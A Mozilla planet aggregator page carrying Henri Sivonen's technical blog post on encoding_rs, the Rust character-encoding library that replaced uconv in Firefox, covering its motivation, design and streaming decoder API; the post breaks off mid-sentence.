</div></div></div><div class="permalink"><a href="https://blog.mozvr.com/a-new-browser-for-magic-leap/">by Andre Vrignaud at <time datetime="2018-12-03T19:00:00Z" title="December 03, 2018 07:00 PM GMT">‰∏äÂçà3:00:00</time></a></div></div><h2><time datetime="2018-12-03">Monday, 3 December 2018</time></h2><div class="news henri-sivonen"><a id="news-52"></a><h3><a href="https://hsivonen.fi/" title="Henri Sivonen‚Äôs pages (Mozilla-only edition)">Henri Sivonen</a> ‚Äî <a href="https://hsivonen.fi/encoding_rs/">encoding_rs: a Web-Compatible Character Encoding Library in Rust</a></h3><div class="entry"><div class="content"><p><a href="https://crates.io/crates/encoding_rs">encoding_rs</a> is a high-decode-performance, low-legacy-encode-footprint and high-correctness implementation of the WHATWG <a href="https://encoding.spec.whatwg.org/">Encoding Standard</a> written in Rust. In Firefox 56, encoding_rs replaced uconv as the character encoding library used in Firefox. This wasn‚Äôt an addition of a component but an actual replacement: uconv was removed  when encoding_rs landed. This writeup covers the motivation and design of encoding_rs, as well as some benchmark results.

</p><p>Additionally, encoding_rs contains a submodule called <code>encoding_rs::mem</code> that‚Äôs meant for efficient encoding-related operations on UTF-16, UTF-8, and Latin1 in-memory strings‚Äîi.e., the kind of strings that are used in Gecko C++ code. This module is discussed separately after describing encoding_rs proper.

</p><p>The C++ integration of encoding_rs is not covered here and is covered in <a href="http://hsivonen.iki.fi/modern-cpp-in-rust/">another write-up</a> instead.

</p><h3>TL;DR</h3>

<p>Rust‚Äôs borrow checker is used with on-stack structs that get optimized away to enforce an ‚Äúat most once‚Äù property that matches reads and writes to buffer space availability checks in legacy CJK converters. Legacy CJK converters are the most risky area in terms of memory-safety bugs in a C or C++ implementation.

</p><p>Decode is very fast relative to other libraries with the exception of some single-byte encodings on ARMv7. Particular effort has gone into validating UTF-8 and converting UTF-8 to UTF-16 efficiently. ASCII runs are handled using SIMD when it makes sense. There is tension between making ASCII even faster vs. making transitions between ASCII and non-ASCII more expensive. This tension is the clearest when encoding from UTF-16, but it‚Äôs there when decoding, too.

</p><p>By default, there is no encode-specific data other than 32 <i>bits</i> per single-byte encoding. This makes legacy CJK encode extremely slow by default <i>relative</i> to other libraries but still fast enough in for the browser use cases. That is, the amount of text one could reasonably submit at a time in a form submission encodes so fast even on a Raspberry Pi 3 (standing in for a low-end phone) that the user will not notice. Even with only 32 bits of encode-oriented data, multiple single-byte encoders are competitive with ICU though only the windows-1252 applied to ASCII or almost ASCII input is competitive with Windows system encoders. Faster CJK legacy encode is available as a compile-time option. But ideally, you should only be using UTF-8 for output anyway.</p>

<p>(If you just want to see the benchmarks and don‚Äôt have time for the discussion of the API and implementation internals, you can <a href="http://hsivonen.iki.fi/feed/mozilla/#benchmarking">skip to the benchmarking section</a>.)

</p><h3>Scope</h3>

<p>Excluding the <code>encoding_rs::mem</code> submodule, which is discussed after encoding_rs proper, encoding_rs implements the character encoding conversions defined in the Encoding Standard as well as the mapping from labels (i.e. strings in protocol text that identify encodings) to encodings.

</p><p>Specifically, encoding_rs does the following:</p>
<ul>
<li>Decodes a stream of bytes in an Encoding Standard-defined character encoding
into valid aligned native-endian in-RAM UTF-16 (units of <code>u16</code>).</li>
<li>Encodes a stream of potentially-invalid aligned native-endian in-RAM UTF-16
(units of <code>u16</code>) into a sequence of bytes in an Encoding
Standard-defined character encoding as if the lone surrogates had been
replaced with the REPLACEMENT CHARACTER before performing the encode.
(Gecko‚Äôs UTF-16 is potentially invalid.)</li>
<li>Decodes a stream of bytes in an Encoding Standard-defined character
encoding into valid UTF-8.</li>
<li>Encodes a stream of valid UTF-8 into a sequence of bytes in an Encoding
Standard-defined character encoding. (Rust‚Äôs UTF-8 is guaranteed-valid.)</li>
<li>Does the above in streaming (input and output split across multiple
buffers) and non-streaming (whole input in a single buffer and whole
output in a single buffer) variants.</li>
<li>Avoids copying (borrows) when possible in the non-streaming cases when
decoding to or encoding from UTF-8.</li>
<li>Resolves textual labels that identify character encodings in
protocol text into type-safe objects representing the those encodings
conceptually.</li>
<li>Maps the type-safe encoding objects onto strings suitable for
returning from <code>document.characterSet</code>.</li>
<li>Validates UTF-8 (in common instruction set scenarios a bit faster for Web
workloads than the Rust standard library; hopefully will get upstreamed some
day) and ASCII.</li>
</ul>

<p>Notably, the JavaScript APIs defined in the Encoding Standard are not implemented by encoding_rs directly. Instead, they are implemented in Gecko as a thin C++ layer that calls into encoding_rs.

</p><h3>Why is a Character Encoding Conversion Library Even Needed Anymore?</h3>

<p>The Web is UTF-8 these days and Rust uses UTF-8 as the in-RAM Unicode representation, so why is a character encoding conversion library even needed anymore? The answer is, of course, ‚Äúfor legacy reasons‚Äù.</p>

<p>While the HTML spec <a href="https://html.spec.whatwg.org/#charset">requires</a> the use of UTF-8 and the Web is over 90% UTF-8 (according to <a href="https://w3techs.com/technologies/history_overview/character_encoding">W3Techs</a>, whose methodology is questionable considering that they report e.g. ISO-8859-1 separately from windows-1252 and GB2312 separately from GBK even though the Web Platform makes no such distinctions, but Google hasn‚Äôt published their numbers <a href="https://googleblog.blogspot.com/2012/02/unicode-over-60-percent-of-web.html">since 2012</a>), users still need to access the part of the Web that has not migrated to UTF-8 yet. That part does not consist only of ancient static pages, either. For example, in Japan there are still news sites that publish new content every day in Shift_JIS. Over here in Finland, I do my banking using a Web UI that is still encoded in ISO-8859-15.</p>

<p>Another side of the legacy is inside the browser engine. Gecko, JavaScript and the DOM API originate from the 1990s when the way to represent Unicode in RAM was in 16-bit units as can also been seen in other software from that era, such as Windows NT, Java, Qt and ICU. (Unicode was formally extended beyond 16 bits in Unicode 2.0 in 1996 but non-Private Use Characters were not assigned outside the Basic Multilingual Plane until Unicode 3.1 in 2001.)</p>

<h3>Why a Rewrite?</h3>

<p>Regardless of the implementation language, the character encoding library in Gecko was in need of a rewrite for three reasons:

</p><ol>
<li><p>The addition of Rust code in Firefox brought about the need to be able to convert to and from UTF-8 directly and in terms of binary size, it didn‚Äôt make sense to have distinct libraries for converting to and from UTF-16 and for converting to and from UTF-8. Instead, a unified library using the same lookup tables for both was needed. The old code wasn‚Äôt designed to yield both UTF-16-targeting and UTF-8-targeting machine code from the same source. The addition of an efficient capability to decode to UTF-8 or to encode from UTF-8 would have involved a level of change comparable to a rewrite.

</p></li><li><p>The old library was crufty enough that it was easier to make correctness improvements by the means of a rewrite than by the means of incremental fixes.
</p><p> In Firefox 43, I had already rewritten the Big5 decoder and encoder in C++, because a rewrite was easier than modifying the old code. In that particular case, the old code used the Private Use Area (PUA) of the Basic Multilingual Plane (BMP) for Hong Kong Supplementary Character Set (HKSCS) characters. However, after the old code was written, HKSCS characters had been assigned proper code points in Unicode, but many of the assignments are on the Supplementary Ideographic Plane (Plane 2). When a fundamental assumption, such as all the characters in an encoding mapping to the BMP, no longer holds, a rewrite is easier than an incremental change.
</p><p>As another example (that showed up after the initial rewrite proposal but before the implementation got properly going), the <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1224505">ISO-2022-JP decoder had an XSS vulnerability</a> that was difficult to fix without restructuring the existing code. I actually tried to write a patch for the old code and gave up.
</p><p>In general, the code structure of the old multi-byte decoders differed from the spec text so much that it would have been harder to try to figure out if the code does what the spec requires than to write new code according to the spec.

</p></li><li><p>The old code was written at a time when the exact set of behaviors that Web-exposed character encodings exhibit wasn‚Äôt fully understood. For this reason, the old code had generality that is no longer useful now that we know the full set of Web-exposed legacy encodings and can be confident that there will be no additional legacy encodings introduced with additional behaviors anymore. 
</p><p>As the most notable example, the old code assumed that the lower half of single-byte encodings might not be ASCII. By the time of <a href="https://docs.google.com/document/d/13GCbdvKi83a77ZcKOxaEteXp1SOGZ_9Fmztb9iX22v0/edit">planning</a> encoding_rs, single-byte encodings whose lower half wasn‚Äôt ASCII had already been removed as part of previous Encoding Standard-compliance efforts. Some of the multi-byte encoding handling code also had configurability for the single-byte mode that allowed for non-ASCII single-byte mode. However, some multi-byte encodings had already been migrated off the generic two-byte encoding handling code years ago.
</p><p>There had been generic two-byte encoding handling code, but it no longer made sense when only EUC-KR remained as an encoding exhibiting the generic characteristics. Big5 was able to decode to Plane 2, GBK had grown four-byte sequences as part of the evolution to GB18030, EUC-JP had grown support for three-byte sequences in order to support JIS X 0212 and Shift_JIS never had the EUC structure to begin with and had single-byte half-width katakana. Even EUC-KR itself had deviated from the original EUC structure by being extended to support all precomposed Hangul syllables (not just the ones in common use) in windows-949.
</p></li></ol>

<p>When a rewrite made sense in any case, it made sense to do the rewrite in Rust, because a rewrite of a clearly identifiable subsystem is exactly the kind of thing that is suitable for rewriting in Rust and the problem domain could use memory-safety. The old library was created in early 1999, but it still had a <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1255863">buffer overrun discovered in it in 2016</a> (in code added in the 2001 and 2002). This shows that the notion that code written in a memory-unsafe language becomes safe by being ‚Äúbattle-hardened‚Äù if it has been broadly deployed for an extended period of time is a myth. Memory-safety needs a systematic approach. Calendar time and broad deployment are not sufficient to turn unsafe code into safe code.

</p><p>(The above-mentioned bug discovered in 2016 wasn‚Äôt the last uconv security bug to be fixed. In 2018, a <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1440926">memory-safety-relevant integer overflow bug</a> was discovered in uconv after uconv had already been replaced with encoding_rs in non-ESR Firefox but uconv was still within security support in ESR. However, that bug was in the new Big5 code that I wrote for Firefox 43, so it can‚Äôt be held against the ancient uconv code. I had fixed the corresponding encoding_rs bug before encoding_rs landed in Firefox 56. The uconv bug was fixed in Firefox ESR 52.7.)

</p><h3>Why not ICU or rust-encoding?</h3>

<p>As noted above, a key requirement was the ability to decode to and from both UTF-16 and UTF-8, but ICU supports only decoding to and from UTF-16 and rust-encoding supports only decoding to and from UTF-8. Perhaps one might argue that pivoting via another UTF would be fast <i>enough</i>, but experience indicated that pivoting via another UTF posed at least a mental barrier: Even after the benefits of UTF-8 as an in-memory Unicode representation were known, Gecko subsystems had been written to use UTF-16 because that was what uconv decoded to.

</p><p>A further problem with ICU is that it does not treat the Encoding Standard as its conformance target. <a href="https://cs.chromium.org/chromium/src/third_party/icu/scripts/">Chrome patches ICU substantially</a> for conformance. I didn‚Äôt want to maintain a similar patch set in the Gecko context and instead wanted a library that treats the Encoding Standard as its conformance target.

</p><p>The invasiveness of the changes to rust-encoding that would have been needed to meet the API design, performance and UTF-16 targeting goals would have been large enough that it made sense to pursue them in a new project instead of trying to impose the requirements onto an existing project.

</p><h3>API Design Problems</h3>

<p>In addition to internal problems, uconv also had a couple of API design problems. First, the decoder API lacked the ability to signal the end of the stream. This meant that there was no way for the decoder to generate a REPLACEMENT CHARACTER when the input stream ended with an incomplete byte sequence. It was possible for the caller to determine from the status code if the last buffer passed to the decoder ended with an incomplete byte sequence, but then it was up to the caller to generate the REPLACEMENT CHARACTER in that situation even though the decoder was generally expected to provide this service. As a result, only one caller in the code base, the <code>TextDecoder</code> implementation, did the right thing. Furthermore, even though the encoder side had an explicit way to signal the end of the stream, it was a separate method leading to more complexity for callers than just being able to say that a buffer is the last buffer.

</p><p>Additionally, the API contract was unclear on whether it was supposed to fill buffers exactly potentially splitting a surrogate pair across buffer boundaries or whether it was supposed to guarantee output validity on a per-method call basis. In a situation where the input and output buffers were exhausted simultaneously, it was unspecified whether the converter should signal that the input was exhausted or that the output was exhausted. In cases where it wasn‚Äôt the responsibility of the converter to handle the replacement of malformed byte sequences when decoding or unmappable characters when encoding, the API left needlessly much responsibility to the caller to advance over the faulty input and to figure out what the faulty input was in the case where that mattered, i.e. when encoding and producing numeric character references for unmappable characters.

</p><p>Character encoding conversion APIs tend to exhibit common problems, so the above uconv issues didn‚Äôt make uconv particularly flawed compared to other character encoding conversion APIs out there. In fact, to uconv‚Äôs credit at least in the form that it had evolved into by the time I got involved, given enough output space uconv always consumed all the input provided to it. This is very important from the perspective of API usability. It‚Äôs all too common for character encoding conversion APIs to backtrack if the input buffer ends with an incomplete byte sequence and to report the incomplete byte sequence at the end of the input buffer as not consumed. This leaves it to the caller to take those unconsumed bytes and to copy them to the start of the next buffer so that they can be completed by the bytes that follow. Even worse, sometimes this behavior isn‚Äôt documented and is up to the caller of the API to discover by experimentation. This behavior also imposes a, typically undocumented, minimum input buffer size, because the input buffer has to be large enough for at least one complete byte sequence to fit. If the input trickles in byte by byte, it‚Äôs up to the caller to arrange them into chunks large enough to contain a complete byte sequence.

</p><p>Sometimes, the API design problem described in the previous paragraph is conditional on requesting error reporting. When I was writing the <a href="https://about.validator.nu/htmlparser/">Validator.nu HTML Parser</a>, I discovered that the <code>java.nio.charset</code> character encoding conversion API was well-behaved when it was asked to handle errors on its own, but when the caller asked for the errors to be reported, the behavior undocumentedly changed to not consuming all the input offered even if there was enough output space. This was because the error reporting mechanism sought to designate the exact bytes in error by giving the caller the number of erroneous bytes corresponding to a single error. In order to make a single number make sense, the bytes always had to be counted backwards from the current position, which meant that the current position had to be placed such that it was at the end of the erroneous sequence and additionally the API sought to make it so that the entire erroneous sequence was in the buffer provided and not partially in a past already discarded buffer.

</p><p>Additionally, as a more trivial to describe matter, but as a <a href="https://www.unicode.org/reports/tr36/#Some_Output_For_All_Input">security-wise</a> potentially very serious matter, some character encoding conversion APIs offer to provide a mode that ignores errors. Especially when decoding and especially in the context of input such as HTML that has executable (JavaScript) and non-executable parts, silently dropping erroneous byte sequences instead of replacing them with the REPLACEMENT CHARACTER is a security problem. Therefore, it‚Äôs a bad idea for character encoding conversion API to offer a mode where errors are neither signaled to the caller nor replaced with the REPLACEMENT CHARACTER.

</p><p>Finally, some APIs fail to provide a high-performance streaming mode where the caller is responsible for output buffer allocation. (This means two potential failures: First, failure to provide a streaming mode and, second, providing a streaming  mode but converter seeks to control the output buffer allocation.)

</p><p>In summary, in my experience, common character encoding conversion API design problems are the following:

</p><ul>
<li>Failure to provide a streaming mode
  <ul><li>E.g. the kernel32 conversion APIs</li></ul>
</li><li>In streaming mode, failure to let the caller signal the end of the stream
  <ul><li>E.g. uconv decode API and Qt (.NET can signal this but the <a href="https://msdn.microsoft.com/en-us/library/h6w985hz(v=vs.110).aspx#Remarks">documentation</a> says the converter ignores the invalid bytes at the end in that case! I hope the docs are wrong.)</li></ul>
</li><li>In streaming mode, having a separate API entry point for signaling the end of the stream (as opposed to being able to flag a buffer as the last buffer) resulting in two API entry points that can generate output
  <ul><li>E.g. uconv encode API</li></ul>
</li><li>In streaming mode, given sufficient output space, failure to consume all provided input
  <ul><li>E.g. java.nio.charset in error reporting mode, rust-encoding and iconv</li></ul>
</li><li>In streaming mode, seeking to identify which bytes were in error but doing so with too simplistic mechanism leading to also having to have the problem from the previous item
  <ul><li>E.g. java.nio.charset</li></ul>
</li><li>In streaming mode, causing memory allocation when a conversion call is on the stack (as opposed to letting the caller be fully in charge of allocating buffers)
  <ul><li>E.g. Qt, WebKit and rust-encoding</li></ul>
</li><li>In streaming mode, failure to guarantee that the exhaustion of the input buffer is the condition that is reported if both the input and output buffers are exhausted at the same time
  <ul><li>E.g. uconv</li></ul>
</li><li>In streaming mode, seeking to fill the output buffer fully (even if doing so e.g. splits a surrogate pair) instead of guaranteeing that the output is valid on a per-buffer basis
  <ul><li>E.g. ICU by documentation; many others silent on this matter in documentation, so who knows</li></ul>
</li><li>Providing a mode that silently ignores erroneous input sequences
  <ul><li>E.g. rust-encoding, java.nio.charset</li></ul>
</li></ul>

<p>All but the last item are specific to a streaming mode. Streaming is hard. 

</p><h3>Other Design Considerations</h3>

<p>There are other API design considerations that would be unfair to label as ‚Äúproblems‚Äù, but that are still very relevant to designing a new API. These relate mainly to error handling and byte order mark (BOM) handling.

</p><h4>Replacement of Errors</h4>

<p>It is typical for character encoding conversion APIs to treat error handling as a mode that is set on a converter object as opposed to treating error handling as a different API entry point. API-wise it makes sense to have different entry points in order to have different return values for the two cases. Specifically, when the converter handles errors, the status of the conversion call cannot be that conversion stopped on an error for the caller to handle. Additionally, when the converter handles errors, it may make sense to provide a flag that indicates whether there where errors even though they were automatically handled.

</p><p>Implementation-wise, experience suggests that baking error handling into each converter complicates code considerably and adds opportunities for bugs. Making the converter implementation always signal errors and having an optional wrapper that deals with those errors so that the application developer doesn‚Äôt need to leads to a much cleaner design. This design is a natural match for exposing different entry points: one entry point goes directly to the underlying converter and the other goes through the wrapper.

</p><h4>BOM Handling</h4>

<p>BOM sniffing is subtle enough that it is a bad idea to leave it to the application. It‚Äôs more robust to bake it into the conversion library. In particular, getting BOM sniffing right when bytes arrive one at a time is not trivial for applications to handle. Like replacement of errors, different BOM handling modes can be implemented as wrappers around the underlying converters.

</p><h4>Extensibility</h4>

<p>Especially in languages that provide a notion of inheritance, interfaces or traits it is alluring for the API designer to seek to define an abstract conversion API that others can write more converters for. However, in the case of the Web, the set of encodings is closed and includes only those that are defined in the Encoding Standard. As far as the use cases in the Web context go, extensibility is not needed. On the contrary, especially in a code base that is also used in a non-Web context like Gecko is used in Thunderbird in the email context, it is a <i>feature</i> that we can be confident on the Web side that if we have a type that represents an encoding defined in the Encoding Standard it can‚Äôt exhibit behaviors from outside the Encoding Standard. By design, encoding_rs is not extensible, so an encoding_rs <code>Encoding</code> does not represent any imaginable character encoding but instead represents a character encoding from the Encoding Standard. For example, we know from the type that we don‚Äôt accidentally have a UTF-7 decoder in Gecko code that has Web expectations even though Thunderbird contains a UTF-7 decoder in its codebase. (If you are interested in decoding email in Rust, there is a <a href="https://crates.io/crates/charset">crate</a> that wraps encoding_rs, adds UTF-7 decoding and maintains a type distinction between Web encodings and email encodings.)

</p><p>Additionally, in the context of Rust and its Foreign Function Interface (FFI), it helps that references are references to plain structs and not trait objects. Whereas C++ puts a vtable pointer on the objects allowing pointers to polymorphic types to have the same size as C pointers, Rust‚Äôs type erasure puts the vtable pointer in the reference. A Rust reference to a struct has the same machine representation as a plain (non-null) C pointer. A Rust reference to a trait-typed thing is actually two pointers: one to the instance and another to the vtable appropriate for the concrete type of the instance.  Since interoperability with C++ is a core design goal for encoding_rs, using the kind of types whose references are the same as C pointers avoids the problem of losing the vtable pointer when crossing the FFI boundary.

</p><h4>Iterators vs. Slices</h4>

<p>Conceptually a character encoding is a mapping from a stream of bytes onto a stream of Unicode scalar values and, in most cases, vice versa. Therefore, it would seem that the right abstraction for a converter is an iterator adaptor that consumes an iterator over bytes and yields Unicode scalar values (or vice versa).

</p><p>There are two problems with modeling character encoding converters as iterator adaptors. First, it leaves optimization to the compiler, when manual optimizations across runs of code units are desirable. Specifically, it is a core goal for encoding_rs to make ASCII handling fast using SIMD, and the compiler does not have enough information about the data to know to produce ASCII-sequence-biased autovectorization. Second, Rust iterators are ill-suited for efficient and (from the C perspective) idiomatic exposure over the FFI.

</p><p>The API style of unconv, <code>java.nio.charset</code>, iconv, etc., of providing input and output buffers of several code units at a time to the converter is friendly both to SIMD and to FFI (Rust slices trivially decompose to pointer and length in C). While this isn‚Äôt 100% rustic like iterators, slices still aren‚Äôt unrustic.

</p><h3>The API Design</h3>

<p>This finally brings us to the <a href="https://docs.rs/encoding_rs/">actual API</a>. There are three public structs:
<a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Encoding.html"><code>Encoding</code></a>, <a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Decoder.html"><code>Decoder</code></a> and <a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Encoder.html"><code>Encoder</code></a>. From the point of view of the application developer, these act like traits (or interfaces or superclasses to use concepts from other languages) even though they are structs. Instead of using  language implementation-provided vtables for dynamic dispatch, they internally have an enum that wraps private structs that are conceptually like subclasses. The use of private enum for dispatch avoids vtable pointers in FFI, makes the hierarchy intentionally non-extensible (see above) and allows BOM sniffing to change what encoding a <code>Decoder</code> is a decoder for.

</p><p>There is one statically allocated instance of <code>Encoding</code> for each encoding defined in the Encoding Standard. These instances have publicly visible names that allow application code to statically refer to a specific encoding (commonly, you want to do this with UTF-8, windows-1252, and the replacement encoding). To find an <code>Encoding</code> instance dynamically at runtime based on a label obtained from protocol text, there is a static method <code>fn Encoding::<a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Encoding.html#method.for_label">for_label</a>(label: &amp;[u8]) -&gt; &amp;'static Encoding</code>.

</p><p>The <code>Encoding</code> struct provides convenience methods for non-streaming conversions. These are ‚Äúconvenience‚Äù methods in the sense that they are implemented on top of <code>Decoder</code> and <code>Encoder</code>. An application that only uses non-streaming conversions only needs to deal with <code>Encoding</code> and doesn‚Äôt need to use <code>Decoder</code> and <code>Encoder</code> at all.

</p><h4>Streaming API</h4>

<p><code>Decoder</code> and <code>Encoder</code> provide streaming conversions and are allocated at runtime, because they encapsulate state related to the streaming conversion. On the <code>Encoder</code> side, only ISO-2022-JP is actually stateful, so most of the discussion here will focus on <code>Decoder</code>.

</p><p>Internally, the encoding-specific structs wrapped by <code>Decoder</code> are macroized to generate decode to UTF-8 and decode to UTF-16 from the same source code (likewise for <code>Encoder</code>). Even though Rust applications are expected to use the UTF-8 case, I‚Äôm going to give examples using the UTF-16 case, because it doesn‚Äôt involve the distinction between <code>&amp;str</code> and <code>&amp;[u8]</code> which would distract from the more important issues.

</p><p>The fundamental function that <code>Decoder</code> provides is:<br />
<code>fn <a class="fnname" href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Decoder.html#method.decode_to_utf16_without_replacement">decode_to_utf16_without_replacement</a>(<br />¬†¬†¬†¬†&amp;mut self, <br />¬†¬†¬†¬†src: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">&amp;[</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.u8.html">u8</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">]</a>, <br />¬†¬†¬†¬†dst: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">&amp;mut [</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.u16.html">u16</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">]</a>, <br />¬†¬†¬†¬†last: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.bool.html">bool</a><br />) -&gt; <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">(</a><a class="enum" href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/enum.DecoderResult.html" title="enum encoding_rs::DecoderResult">DecoderResult</a>, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.usize.html">usize</a>, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.usize.html">usize</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">)</a></code></p>

<p>This function wraps BOM sniffing around an underlying encoding-specific implementation that takes the same arguments and has the same return value. The <code>Decoder</code>-provided wrapper first exposes the input to a BOM sniffing state machine and once the state machine gets out of the way delegates to the underlying implementation. <code>Decoder</code> instances can‚Äôt be constructed by the application directly. Instead, they need to be obtained from factory functions on <code>Encoding</code>. The factory functions come in three flavors for three different BOM sniffing modes: full BOM sniffing (the default), which may cause the <code>Decoder</code> to morph into a decoder for a different encoding than initially (using enum for dispatch shows its usefulness here!), BOM removal (no morphing but the BOM for the encoding itself is skipped) and without BOM handling. The struct is the same in all cases, but the different factory methods initialize the state of the BOM sniffing state machine differently.

</p><p>The method takes an input buffer (<code>src</code>) and an output
buffer (<code>dst</code>) both of which are caller-allocated. The method then decodes bytes from <code>src</code> into Unicode scalar values that are stored (as UTF-16) into <code>dst</code> until one of the following three things happens:</p>

<ol>
<li>A malformed byte sequence is encountered.</li>
<li>All the input bytes have been processed.</li>
<li>The output buffer has been filled so near capacity that the decoder
cannot be sure that processing an additional byte of input wouldn‚Äôt
cause so much output that the output buffer would overflow.</li>
</ol>

<p>The return value is a tuple of a status indicating which one
of the three reasons to return happened, how many input bytes were read and 
how many output code units were written. The status is a
<a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/enum.DecoderResult.html"><code>DecoderResult</code></a> enumeration (possibilities <code>Malformed</code>, <code>InputEmpty</code> and
<code>OutputFull</code> corresponding to the three cases listed above).</p>

<p>The output written into <code>dst</code> is guaranteed to be valid UTF-16,
and the output after each call is guaranteed to consist of
complete characters. (I.e. the code unit sequence for the last character is
guaranteed not to be split across output buffers.) This implies that the output buffer must be long enough for an astral character to fit (two UTF-16 code units) and the output buffer might not be fully filled. While it may seem wasteful not to fill the last slot of the output buffer in the common case, this design significantly simplifies the implementation while also simplifying callers by guaranteeing to the caller that it won‚Äôt have to deal with split surrogate pairs.</p>

<p>The boolean argument <code>last</code> indicates that the end of the stream is reached
when all the bytes in <code>src</code> have been consumed.</p>

<p>A <code>Decoder</code> object can be used to incrementally decode a byte stream. During the processing of a single stream, the caller must call the method
zero or more times with <code>last</code> set to <code>false</code> and then call <code>decode_*</code> at
least once with <code>last</code> set to <code>true</code>. If the <code>decode_*</code> with <code>last</code> set to <code>true</code> returns <code>InputEmpty</code>,
the processing of the stream has ended. Otherwise, the caller must call
<code>decode_*</code> again with <code>last</code> set to <code>true</code> (or treat a <code>Malformed</code> result as
 a fatal error).</p>

<p>Once the stream has ended, the <code>Decoder</code> object must not be used anymore.
That is, you need to create another one to process another stream. Unlike with some other libraries that encourage callers to recycle converters that are expensive to create, encoding_rs guarantees that converters are extremely cheap to create. (More on this later.)</p>

<p>When the decoder returns <code>OutputFull</code> or the decoder returns <code>Malformed</code> and
the caller does not wish to treat it as a fatal error, the input buffer
<code>src</code> may not have been completely consumed. In that case, the caller must
pass the unconsumed contents of <code>src</code> to the method again upon the next
call.</p>

<p>Typically the application doesn‚Äôt wish to do its own error handling and just wants errors to be replaced with the REPLACEMENT CHARACTER.  For this use case, there is another method that wraps the previous method and provides the replacement. The wrapper looks like this:<br />
<code>fn <a class="fnname" href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/struct.Decoder.html#method.decode_to_utf16">decode_to_utf16</a>(<br />¬†¬†¬†¬†&amp;mut self, <br />¬†¬†¬†¬†src: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">&amp;[</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.u8.html">u8</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">]</a>, <br />¬†¬†¬†¬†dst: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">&amp;mut [</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.u16.html">u16</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">]</a>, <br />¬†¬†¬†¬†last: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.bool.html">bool</a><br />) -&gt; <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">(</a><a class="enum" href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/enum.CoderResult.html" title="enum encoding_rs::CoderResult">CoderResult</a>, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.usize.html">usize</a>, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.usize.html">usize</a>, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.bool.html">bool</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">)</a></code>

</p><p>Notably, the status enum is different, because the case of malformed sequences doesn‚Äôt need to be communicated to the application. Also, the return tuple includes a boolean flag to indicate whether there where errors.

</p><p>Additionally, there is a method for querying the worst case output size even the current state of the decoder and the length of an input buffer. If the length of the output buffer is at least the worst case, the decoder guarantees that it won‚Äôt return <code>OutputFull</code>.

</p><h4>Identifying Malformed Sequences</h4>

<p>Initially, the plan was simply not to support applications that need to identify which input bytes were in error, because I thought that it wasn‚Äôt possible to do so without complicating the API for everyone else. However, very early into the implementation phase, I realized that it is possible to identify which bytes are in error without burdening applications that don‚Äôt care if the applications that want to know are responsible for remembering the last <i>N</i> bytes decoded where <i>N</i> is relatively small. It turns out that <i>N</i> is 6.

</p><p>For a malformed sequence that corresponds to a single decode error (i.e. a single REPLACEMENT CHARACTER) a <code>DecoderResult::Malformed(u8, u8)</code> is returned. The first wrapped integer indicates the length of the malformed byte sequence. The second wrapped integer indicates the number of bytes that were consumed after the malformed sequence. If the second integer is zero, the last byte that was consumed is the last byte of the malformed sequence. The malformed bytes may have been part of an earlier input buffer, which is why it is the responsibility of the application that wants to identify the bytes that were in error.

</p><p>The first wrapped integer can have values 1, 2, 3 or 4. The second wrapped integer can have values 0, 1, 2 or 3. The worst-case sum of the two is 6, which happens with ISO-2022-JP.</p>

<h4>Identifying Unmappable Characters</h4>

<p>When encoding to an encoding other than UTF-8 (the Encoding Standard does not support encoding into UTF-16LE or UTF-16BE, and there is one Unicode scalar value that cannot be encoded into gb18030), it is possible that the encoding cannot represent a character that is being encoded. In this case, instead of returning backward-looking indices <code>EncoderResult::Unmappable(char)</code> wraps the Unicode scalar value that needs to be replaced with a numeric character reference when performing replacement. In the case of ISO-2022-JP, this Unicode scalar value can be the REPLACEMENT CHARACTER instead of a value actually occurring in the input if the input contains U+000E, U+000F, or U+001B.

</p><p>This asymmetry between how errors are signaled in the decoder and encoder scenarios makes the signaling appropriate for each scenario instead of optimizing for consistency where consistency isn‚Äôt needed.

</p><h4>Non-Streaming API</h4>

<p>As noted earlier, <code>Encoding</code> provides non-streaming convenience methods built on top of the streaming functionality. Instead of being simply wrappers for the streaming conversion, the non-streaming methods first try to check if the input is borrowable as output without conversion. For example, if the input is all ASCII and the encoding is ASCII-compatible, a <code>Cow</code> borrowing the input is returned. Likewise, the input is borrowed when the encoding is UTF-8 and the input is valid or when the encoding is ISO-2022-JP and the input contains no escape sequences. Here‚Äôs an example of a non-streaming conversion method:<br />
